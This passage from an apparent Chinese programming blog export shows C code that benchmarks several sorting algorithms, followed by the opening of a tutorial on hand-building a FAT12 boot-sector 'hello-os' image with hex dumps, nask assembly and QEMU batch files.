class="type">void</span> <span class="title">QuickSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="built_in">QuickSortR</span>(R,<span class="number">0</span>,n<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*5、堆排序*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//调整堆</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sift</span><span class="params">(RecType R[],<span class="type">int</span> low,<span class="type">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i=low,j=<span class="number">2</span>*i;                        <span class="comment">//R[j]是R[i]的左孩子</span></span><br><span class="line">    RecType temp=R[i];</span><br><span class="line">    <span class="keyword">while</span> (j&lt;=high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (j&lt;high &amp;&amp; R[j].key&lt;R[j+<span class="number">1</span>].key)  <span class="comment">//若右孩子较大,把j指向右孩子</span></span><br><span class="line">            j++;                                <span class="comment">//变为2i+1</span></span><br><span class="line">        <span class="keyword">if</span> (temp.key&lt;R[j].key)</span><br><span class="line">        &#123;</span><br><span class="line">            R[i]=R[j];                          <span class="comment">//将R[j]调整到双亲结点位置上</span></span><br><span class="line">            i=j;                                <span class="comment">//修改i和j值,以便继续向下筛选</span></span><br><span class="line">            j=<span class="number">2</span>*i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">break</span>;                             <span class="comment">//筛选结束</span></span><br><span class="line">    &#125;</span><br><span class="line">    R[i]=temp;                                  <span class="comment">//被筛选结点的值放入最终位置</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//堆排序</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">HeapSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    RecType temp;</span><br><span class="line">    <span class="keyword">for</span> (i=n/<span class="number">2</span>; i&gt;=<span class="number">1</span>; i--) <span class="comment">//循环建立初始堆</span></span><br><span class="line">        <span class="built_in">sift</span>(R,i,n);</span><br><span class="line">    <span class="keyword">for</span> (i=n; i&gt;=<span class="number">2</span>; i--) <span class="comment">//进行n-1次循环,完成推排序</span></span><br><span class="line">    &#123;</span><br><span class="line">        temp=R[<span class="number">1</span>];       <span class="comment">//将第一个元素同当前区间内R[1]对换</span></span><br><span class="line">        R[<span class="number">1</span>]=R[i];</span><br><span class="line">        R[i]=temp;</span><br><span class="line">        <span class="built_in">sift</span>(R,<span class="number">1</span>,i<span class="number">-1</span>);   <span class="comment">//筛选R[1]结点,得到i-1个结点的堆</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*归并排序*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Merge</span><span class="params">(RecType R[],<span class="type">int</span> low,<span class="type">int</span> mid,<span class="type">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RecType *R1;</span><br><span class="line">    <span class="type">int</span> i=low,j=mid+<span class="number">1</span>,k=<span class="number">0</span>; <span class="comment">//k是R1的下标,i、j分别为第1、2段的下标</span></span><br><span class="line">    R1=(RecType *)<span class="built_in">malloc</span>((high-low+<span class="number">1</span>)*<span class="built_in">sizeof</span>(RecType));  <span class="comment">//动态分配空间</span></span><br><span class="line">    <span class="keyword">while</span> (i&lt;=mid &amp;&amp; j&lt;=high)       <span class="comment">//在第1段和第2段均未扫描完时循环</span></span><br><span class="line">        <span class="keyword">if</span> (R[i].key&lt;=R[j].key)     <span class="comment">//将第1段中的记录放入R1中</span></span><br><span class="line">        &#123;</span><br><span class="line">            R1[k]=R[i];</span><br><span class="line">            i++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>                            <span class="comment">//将第2段中的记录放入R1中</span></span><br><span class="line">        &#123;</span><br><span class="line">            R1[k]=R[j];</span><br><span class="line">            j++;</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">while</span> (i&lt;=mid)                      <span class="comment">//将第1段余下部分复制到R1</span></span><br><span class="line">    &#123;</span><br><span class="line">        R1[k]=R[i];</span><br><span class="line">        i++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j&lt;=high)                 <span class="comment">//将第2段余下部分复制到R1</span></span><br><span class="line">    &#123;</span><br><span class="line">        R1[k]=R[j];</span><br><span class="line">        j++;</span><br><span class="line">        k++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (k=<span class="number">0</span>,i=low; i&lt;=high; k++,i++) <span class="comment">//将R1复制回R中</span></span><br><span class="line">        R[i]=R1[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergePass</span><span class="params">(RecType R[],<span class="type">int</span> length,<span class="type">int</span> n)</span>    <span class="comment">//对整个数序进行一趟归并</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i+<span class="number">2</span>*length<span class="number">-1</span>&lt;n; i=i+<span class="number">2</span>*length)     <span class="comment">//归并length长的两相邻子表</span></span><br><span class="line">        <span class="built_in">Merge</span>(R,i,i+length<span class="number">-1</span>,i+<span class="number">2</span>*length<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> (i+length<span class="number">-1</span>&lt;n)                       <span class="comment">//余下两个子表,后者长度小于length</span></span><br><span class="line">        <span class="built_in">Merge</span>(R,i,i+length<span class="number">-1</span>,n<span class="number">-1</span>);          <span class="comment">//归并这两个子表</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">MergeSort</span><span class="params">(RecType R[],<span class="type">int</span> n)</span>           <span class="comment">//自底向上的二路归并算法</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> length;</span><br><span class="line">    <span class="keyword">for</span> (length=<span class="number">1</span>; length&lt;n; length=<span class="number">2</span>*length) <span class="comment">//进行log2n趟归并</span></span><br><span class="line">        <span class="built_in">MergePass</span>(R,length,n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">GetLargeData</span><span class="params">(RecType R[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">srand</span>(<span class="built_in">time</span>(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">        R[i].key= <span class="built_in">rand</span>();  <span class="comment">//产生0~RAND_MAX间的数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;create number %d \n&quot;</span>, n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*基数排序*/</span></span><br><span class="line"><span class="comment">//以下基数排序，为了统一测试有改造</span></span><br><span class="line"><span class="comment">//8. 基数排序的辅助函数，创建基数排序用的链表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">CreateLink</span><span class="params">(RadixRecType *&amp;p,RecType R[],<span class="type">int</span> n)</span>   <span class="comment">//采用后插法产生链表</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    RadixRecType *s,*t;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        s=(RadixRecType *)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(RadixRecType));</span><br><span class="line">        s-&gt;data = R[i].key;</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            p=s;</span><br><span class="line">            t=s;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            t-&gt;next=s;</span><br><span class="line">            t=s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//8. 基数排序的辅助函数，释放基数排序用的链表</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestoryLink</span><span class="params">(RadixRecType *&amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RadixRecType *q;</span><br><span class="line">    <span class="keyword">while</span>(p!=<span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        q=p-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(p);</span><br><span class="line">        p=q;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//8. 实现基数排序:*p为待排序序列链表指针,基数R和关键字位数D已经作为符号常量定义好</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">RadixSort</span><span class="params">(RadixRecType *&amp;p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    RadixRecType *head[Radix],*tail[Radix],*t; <span class="comment">//定义各链队的首尾指针</span></span><br><span class="line">    <span class="type">int</span> i,j,k;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> d1, d2=<span class="number">1</span>;   <span class="comment">//用于分离出第i位数字，见下面的注释</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">1</span>; i&lt;=Digits; i++)                  <span class="comment">//从低位到高位循环</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//分离出倒数第i位数字，先通过对d1=10^i取余，得到其后i位，再通过整除d2=10^(i-1)得到第i位</span></span><br><span class="line">        <span class="comment">//例如，分离出倒数第1位，即个位数，先对d1=10取余，再整除d2=1</span></span><br><span class="line">        <span class="comment">//再例如，分离出倒数第2位，即十位数，先对d1=100取余，再整除d2=10</span></span><br><span class="line">        <span class="comment">//循环之前，d2已经初始化为1，在这一层循环末增加10倍</span></span><br><span class="line">        <span class="comment">//下面根据d2，得到d1的值</span></span><br><span class="line">        d1=d2*<span class="number">10</span>;</span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>; j&lt;Radix; j++)                 <span class="comment">//初始化各链队首、尾指针</span></span><br><span class="line">            head[j]=tail[j]=<span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">while</span> (p!=<span class="literal">NULL</span>)                 <span class="comment">//对于原链表中每个结点循环</span></span><br><span class="line">        &#123;</span><br><span class="line">            k=(p-&gt;data%d1)/d2;           <span class="comment">//分离出第i位数字k</span></span><br><span class="line">            <span class="keyword">if</span> (head[k]==<span class="literal">NULL</span>)          <span class="comment">//进行分配</span></span><br><span class="line">            &#123;</span><br><span class="line">                head[k]=p;</span><br><span class="line">                tail[k]=p;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                tail[k]-&gt;next=p;</span><br><span class="line">                tail[k]=p;</span><br><span class="line">            &#125;</span><br><span class="line">            p=p-&gt;next;                  <span class="comment">//取下一个待排序的元素</span></span><br><span class="line">        &#125;</span><br><span class="line">        p=<span class="literal">NULL</span>;                         <span class="comment">//重新用p来收集所有结点</span></span><br><span class="line">        <span class="keyword">for</span> (j=<span class="number">0</span>; j&lt;Radix; j++)             <span class="comment">//对于每一个链队循环</span></span><br><span class="line">            <span class="keyword">if</span> (head[j]!=<span class="literal">NULL</span>)          <span class="comment">//进行收集</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (p==<span class="literal">NULL</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    p=head[j];</span><br><span class="line">                    t=tail[j];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    t-&gt;next=head[j];</span><br><span class="line">                    t=tail[j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        t-&gt;next=<span class="literal">NULL</span>;                   <span class="comment">//最后一个结点的next域置NULL</span></span><br><span class="line">        <span class="comment">//下面更新用于分离出第i位数字的d2</span></span><br><span class="line">        d2*=<span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*计算排序时间*/</span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">Sort</span><span class="params">(RecType R[],<span class="type">int</span> n,<span class="type">void</span> func(RecType[],<span class="type">int</span>))</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> beginTime,endTime;</span><br><span class="line">    RecType R1[MaxSize];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)</span><br><span class="line">        R1[i].key=R[i].key;</span><br><span class="line">    beginTime=<span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">func</span>(R1,n);</span><br><span class="line">    endTime=<span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//free(R1);</span></span><br><span class="line">    <span class="keyword">return</span> endTime-beginTime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用基数排序算法完成排序，返回排序用时</span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">Sort1</span><span class="params">(RecType R[], <span class="type">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">long</span> beginTime, endTime;</span><br><span class="line">    RadixRecType *p;</span><br><span class="line">    <span class="built_in">CreateLink</span>(p,R,n);</span><br><span class="line">    beginTime = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">RadixSort</span>(p);</span><br><span class="line">    endTime = <span class="built_in">time</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">DestoryLink</span>(p);</span><br><span class="line">    <span class="keyword">return</span> endTime-beginTime;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RecType R[MaxSize];<span class="comment">//全局变量，避免爆栈</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetLargeData</span>(R,MaxSize);<span class="comment">//100005条</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;1、希尔排序时间：  %ld\n&quot;</span>,<span class="built_in">Sort</span>(R,MaxSize,ShellSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;2、插入排序时间：  %ld\n&quot;</span>,<span class="built_in">Sort</span>(R,MaxSize,InsertSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;3、冒泡排序时间：  %ld\n&quot;</span>,<span class="built_in">Sort</span>(R,MaxSize,BubbleSort1));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;4、快速排序时间：  %ld\n&quot;</span>,<span class="built_in">Sort</span>(R,MaxSize,QuickSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;5、堆排序时间：    %ld\n&quot;</span>,<span class="built_in">Sort</span>(R,MaxSize,HeapSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;6、归并排序时间：  %ld\n&quot;</span>,<span class="built_in">Sort</span>(R,MaxSize,MergeSort));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;7、基数排序时间：  %ld\n&quot;</span>,<span class="built_in">Sort1</span>(R,MaxSize));</span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>01 从计算机结构到汇编程序入门</title>
    <url>/2023/08/31/30day/01%20%E4%BB%8E%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%93%E6%9E%84%E5%88%B0%E6%B1%87%E7%BC%96%E7%A8%8B%E5%BA%8F%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<h1 id="00-准备"><a href="#00-准备" class="headerlink" title="00. 准备"></a>00. 准备</h1><ul>
<li>光盘源码&amp;程序：<a href="https://wwaq.lanzouq.com/ikBJg1702eid">https://wwaq.lanzouq.com/ikBJg1702eid</a></li>
<li>二进制编辑器：<a href="https://wwaq.lanzouq.com/iCgti1702oje">https://wwaq.lanzouq.com/iCgti1702oje</a></li>
</ul>
<h1 id="01-二进制编辑器"><a href="#01-二进制编辑器" class="headerlink" title="01 .二进制编辑器"></a>01 .二进制编辑器</h1><p>在<a href="https://www.vcraft.jp/soft/bz.html">Bz - c.mos (vcraft.jp)</a>下载，解压使用Bz1621.lzh，双击Bz.exe打开二进制编辑器</p>
<p>输入：0到168000行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           +0 +1 +2 +3 +4 +5 +6 +7 +8 +9 +A +B +C +D +E +F</span><br><span class="line">0000:0000  EB 4E 90 48 45 4C 4C 4F 49 50 4C 00 02 01 01 00</span><br><span class="line">0000:0010  02 E0 00 40 0B F0 09 00 12 00 02 00 00 00 00 00</span><br><span class="line">0000:0020  40 0B 00 00 00 00 29 FF FF FF FF 48 45 4C 4C 4F</span><br><span class="line">0000:0030  2D 4F 53 20 20 20 46 41 54 31 32 20 20 20 00 00</span><br><span class="line">0000:0040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">0000:0050  B8 00 00 8E D0 BC 00 7C 8E D8 8E C0 BE 74 7C 8A</span><br><span class="line">0000:0060  04 83 C6 01 3C 00 74 09 B4 0E BB 0F 00 CD 10 EB</span><br><span class="line">0000:0070  EE F4 EB FD 0A 0A 68 65 6C 6C 6F 2C 20 77 6F 72</span><br><span class="line">0000:0080  6C 64 0A 00 00 00 00 00 00 00 00 00 00 00 00 00 </span><br><span class="line">...</span><br><span class="line">0000:01F0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 55 AA</span><br><span class="line">0000:0200  F0 FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">...</span><br><span class="line">0000:1400  F0 FF FF 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br><span class="line">...</span><br><span class="line">0016:7FF0  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>显示：0到168000行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">           0123456789ABCDEF</span><br><span class="line">0000:0000  .N.HELLOIPL.....</span><br><span class="line">0000:0010  ...@............</span><br><span class="line">0000:0020  @.....)....HELLO</span><br><span class="line">0000:0030  -OS   FAT12     </span><br><span class="line">0000:0040  ................</span><br><span class="line">0000:0050  .......l.....tl.</span><br><span class="line">0000:0060  ....&lt;.t.........</span><br><span class="line">0000:0070  ......hello, wor</span><br><span class="line">0000:0080  ld..............</span><br><span class="line">...</span><br><span class="line">0000:01F0  ..............U.</span><br><span class="line">0000:0200  ................</span><br><span class="line">...</span><br><span class="line">0000:1400  ................</span><br><span class="line">...</span><br><span class="line">0016:7FF0  ................</span><br></pre></td></tr></table></figure>

<p>中途或者写完后，可以另存为helloos.img，该文件占用 <strong>1474560（1440*1024）</strong> 字节.</p>
<p>打开 <strong>tolset</strong> 文件夹，在里面新建 <strong>helloos0</strong> 文件夹，将 <strong>helloos.img</strong> 放入并新建两个文件： <strong>install.bat</strong> 和 <strong>run.bat</strong></p>
<p>run.bat</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy helloos.img ..\z_tools\qemu\fdimage0.bin</span><br><span class="line">..\z_tools\make.exe	-C ../z_tools/qemu</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<ul>
<li>第一行 copy：cmd命令 该行将 helloos.img 复制到 qemu 并重命名为 fdimage0.bin</li>
<li>第二行 运行PC模拟器QEMU，让代码在上面跑，模拟器在光盘里 <strong>.&#x2F;tolset&#x2F;z_tools</strong> 目录下</li>
</ul>
<p><strong>install.bat</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">..\z_tools\imgtol.com w a: helloos.img</span><br></pre></td></tr></table></figure>

<p>解释：</p>
<ul>
<li>将 <strong>helloos.img</strong> 刻录到软盘 a    w ：写  a：软盘盘符</li>
</ul>
<p>双击 <strong>run.bat</strong> 运行显示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello, world</span><br></pre></td></tr></table></figure>

<h1 id="02-仅使用DB和RESB的汇编"><a href="#02-仅使用DB和RESB的汇编" class="headerlink" title="02 .仅使用DB和RESB的汇编"></a>02 .仅使用DB和RESB的汇编</h1><p>汇编代码需要编译，这里采用作者自制的编译器 <strong>nask</strong> </p>
<h3 id="超长源代码"><a href="#超长源代码" class="headerlink" title="超长源代码"></a>超长源代码</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DB	0xeb, 0x4e, 0x90, 0x48, 0x45, 0x4c, 0x4c, 0x4f</span><br><span class="line">DB	0x49, 0x50, 0x4c, 0x00, 0x02, 0x01, 0x01, 0x00</span><br><span class="line">DB	0x02, 0xe0, 0x00, 0x40, 0x0b, 0xf0, 0x09, 0x00</span><br><span class="line">DB	0x12, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">DB	0x40, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x29, 0xff</span><br><span class="line">...</span><br><span class="line">DB	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00</span><br></pre></td></tr></table></figure>

<p><strong>asm.bat</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">..\z_tools\nask.exe helloos.nas helloos.img</span><br></pre></td></tr></table></figure>

<p>运行上面命令，可以得到 <strong>helloos.img</strong></p>
<h3 id="使用DB和RESB简化"><a href="#使用DB和RESB简化" class="headerlink" title="使用DB和RESB简化"></a>使用DB和RESB简化</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DB	0xeb, 0x4e, 0x90, 0x48, 0x45, 0x4c, 0x4c, 0x4f</span><br><span class="line">DB	0x49, 0x50, 0x4c, 0x00, 0x02, 0x01, 0x01, 0x00</span><br><span class="line">DB	0x02, 0xe0, 0x00, 0x40, 0x0b, 0xf0, 0x09, 0x00</span><br><span class="line">DB	0x12, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">DB	0x40, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x29, 0xff</span><br><span class="line">DB	0xff, 0xff, 0xff, 0x48, 0x45, 0x4c, 0x4c, 0x4f</span><br><span class="line">DB	0x2d, 0x4f, 0x53, 0x20, 0x20, 0x20, 0x46, 0x41</span><br><span class="line">DB	0x54, 0x31, 0x32, 0x20, 0x20, 0x20, 0x00, 0x00</span><br><span class="line">RESB	16</span><br><span class="line">DB	0xb8, 0x00, 0x00, 0x8e, 0xd0, 0xbc, 0x00, 0x7c</span><br><span class="line">DB	0x8e, 0xd8, 0x8e, 0xc0, 0xbe, 0x74, 0x7c, 0x8a</span><br><span class="line">DB	0x04, 0x83, 0xc6, 0x01, 0x3c, 0x00, 0x74, 0x09</span><br><span class="line">DB	0xb4, 0x0e, 0xbb, 0x0f, 0x00, 0xcd, 0x10, 0xeb</span><br><span class="line">DB	0xee, 0xf4, 0xeb, 0xfd, 0x0a, 0x0a, 0x68, 0x65</span><br><span class="line">DB	0x6c, 0x6c, 0x6f, 0x2c, 0x20, 0x77, 0x6f, 0x72</span><br><span class="line">DB	0x6c, 0x64, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">RESB	368</span><br><span class="line">DB	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xaa</span><br><span class="line">DB	0xf0, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">RESB	4600</span><br><span class="line">DB	0xf0, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">RESB	1469432</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>DB</strong>：往文件里面输入一个字节</li>
<li><strong>RESB</strong>：”reserve byte”的缩写，<strong>RESB XX</strong> 从现在的地址开始空出 <strong>XX</strong> 个字节，nask编译时把空出的填充为 <strong>0x00</strong></li>
</ul>
<h1 id="03-多指令汇编"><a href="#03-多指令汇编" class="headerlink" title="03 .多指令汇编"></a>03 .多指令汇编</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; hello-os</span><br><span class="line">; TAB=4</span><br><span class="line"></span><br><span class="line">; 以下是标准FAT12格式软盘专用的代码 该段80字节</span><br><span class="line"></span><br><span class="line">		DB		0xeb, 0x4e, 0x90</span><br><span class="line">		DB		&quot;HELLOIPL&quot;		; 启动区的名称可以是任意的字符串（8字节） 0x48, 0x45, 0x4c, 0x4c, 0x4f 0x49, 0x50, 0x4c</span><br><span class="line">		DW		512				; 每个扇区（sector）的大小（必须为512字节） 0x00, 0x02,</span><br><span class="line">		DB		1				; 簇（cluster）的大小（必须为1个扇区） 0x01</span><br><span class="line">		DW		1				; FAT的起始位置（一般从第一个扇区开始） 0x01, 0x00</span><br><span class="line">		DB		2				; FAT的个数 0x02,</span><br><span class="line">		DW		224				; 根目录的大小（一般设成224项） 0xe0, 0x00</span><br><span class="line">		DW		2880			; 该磁盘的大小（必须是2880扇区） 0x40, 0x0b</span><br><span class="line">		DB		0xf0			; 磁盘的种类（必须是0xf0） 0xf0</span><br><span class="line">		DW		9				; FAT的长度（必须是9扇区）0x09, 0x00</span><br><span class="line">		DW		18				; 1个磁道（track）有几个扇区（必须是18）  0x12, 0x00</span><br><span class="line">		DW		2				; 磁头数（必须是2） 0x02, 0x00,</span><br><span class="line">		DD		0				; 不使用分区，必须是0 0x00, 0x00, 0x00, 0x00</span><br><span class="line">		DD		2880			; 重写一次磁盘大小 0x40, 0x0b, 0x00, 0x00,</span><br><span class="line">		DB		0,0,0x29		; 意义不明，固定 0x00, 0x00, 0x29</span><br><span class="line">		DD		0xffffffff		; （可能是）卷标号码 0xff, 0xff, 0xff, 0xff</span><br><span class="line">		DB		&quot;HELLO-OS   &quot;	; 磁盘的名称（11字节） 0x48, 0x45, 0x4c, 0x4c, 0x4f,0x2d, 0x4f, 0x53, 0x20, 0x20, 0x20</span><br><span class="line">		DB		&quot;FAT12   &quot;		; 磁盘格式名称（8字节） 0x46, 0x41, 0x54, 0x31, 0x32, 0x20, 0x20, 0x20</span><br><span class="line">		RESB	18				; 先空出18字节</span><br><span class="line"></span><br><span class="line">; 程序主体 该段36字节</span><br><span class="line"></span><br><span class="line">		DB		0xb8, 0x00, 0x00, 0x8e, 0xd0, 0xbc, 0x00, 0x7c</span><br><span class="line">		DB		0x8e, 0xd8, 0x8e, 0xc0, 0xbe, 0x74, 0x7c, 0x8a</span><br><span class="line">		DB		0x04, 0x83, 0xc6, 0x01, 0x3c, 0x00, 0x74, 0x09</span><br><span class="line">		DB		0xb4, 0x0e, 0xbb, 0x0f, 0x00, 0xcd, 0x10, 0xeb</span><br><span class="line">		DB		0xee, 0xf4, 0xeb, 0xfd</span><br><span class="line"></span><br><span class="line">; 信息显示部分 该段512-36-80字节</span><br><span class="line"></span><br><span class="line">		DB		0x0a, 0x0a		; 2个换行</span><br><span class="line">		DB		&quot;hello,my name is hello-os.this is my first os program.&quot;</span><br><span class="line">		DB		0x0a			; 换行</span><br><span class="line">		DB		0</span><br><span class="line"></span><br><span class="line">		RESB	0x1fe-$			; 填写0x00,直到0x001fe 即510</span><br><span class="line"></span><br><span class="line">		DB		0x55, 0xaa      ; 第511 512字节</span><br><span class="line"></span><br><span class="line">; 以下是启动区以外部分的输出</span><br><span class="line"></span><br><span class="line">		DB		0xf0, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">		RESB	4600</span><br><span class="line">		DB		0xf0, 0xff, 0xff, 0x00, 0x00, 0x00, 0x00, 0x00</span><br><span class="line">		RESB	1469432</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>DB</strong>：可以直接写字符串</li>
<li><strong>DW</strong>：”define word” ，写2个字节</li>
<li><strong>DD</strong>：”define double word”，写4个字节</li>
<li>第41行，<strong>RESB	0x1fe-$</strong> 美元符号 <strong>$</strong> 是个变量，在该程序中，我们已经在前面输出了<strong>132</strong>个字节，所以这里的 $ 就是<strong>132</strong>，因此 <strong>0x1fe - $</strong> 就是<strong>378</strong> 连续输出<strong>378</strong>个<strong>0x00</strong>。用它是因为要保证第<strong>510</strong>字节开始地址是<strong>55AA</strong>，如果显示信息如 <strong>“hello, world”</strong> 的有长度变化，不用这个 <strong>$</strong> 自动计算，就会出错。</li>
</ul>
<h3 id="问题：DB-0xeb-0x4e-0x90-是什么意思？"><a href="#问题：DB-0xeb-0x4e-0x90-是什么意思？" class="headerlink" title="问题：DB 0xeb, 0x4e, 0x90 是什么意思？"></a>问题：DB 0xeb, 0x4e, 0x90 是什么意思？</h3><ul>
<li><p>可写为 </p>
